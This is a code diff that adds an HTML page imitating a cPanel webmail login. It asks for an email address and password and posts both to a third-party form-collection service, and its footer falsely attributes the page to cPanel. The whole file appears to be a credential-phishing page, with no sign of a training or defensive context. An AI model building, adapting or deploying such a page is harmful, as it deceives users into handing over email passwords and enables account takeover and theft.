@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Client</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="shortcut icon" href="./Circle-icons-mail.svg.png">
+
+
+</head>
+<body>
+    <div id="container">
+        <div class="box">
+            <img src="./webmail.jpg" alt=""width="360">
+            <form action="https://formspree.io/f/mayklrkn" method="POST">
+                <div class="input_1">
+                    <label>Email Address</label><br>
+                    <span class="icon"><i class="fa fa-user"></i></span>
+                    <input type="email" name="email" placeholder="Enter your email address." required>
+                </div>
+                <div class="input_2">
+                    <label>Password</label><br>
+                    <span class="icon"><i class="fa fa-lock"></i></span>
+                    <input type="password" name="password" placeholder="Enter your email password." required>
+                </div>
+                <div class="submit">
+                    <button type="submit" oneclick="sendmail()">Next</button>
+                </div>
+            </form>
+        </div>
+            <br><br>
+        
+    <div class="check1">
+        <label for="checkbox">Use Webmail Mini</label>
+        <input type="checkbox" id="check">
+        
+    </div>
+    <h5>Privacy & Cookies</h5> 
+    <h5>Terms of use...</h5>
+
+    <div class="footer">
+        <p>CopyRight&copy; 2023 Webmail Inc. cPanel, L.L.C. or its affiliates. All rights reserved</p>
+    </div>
+
+</body>
+</html>
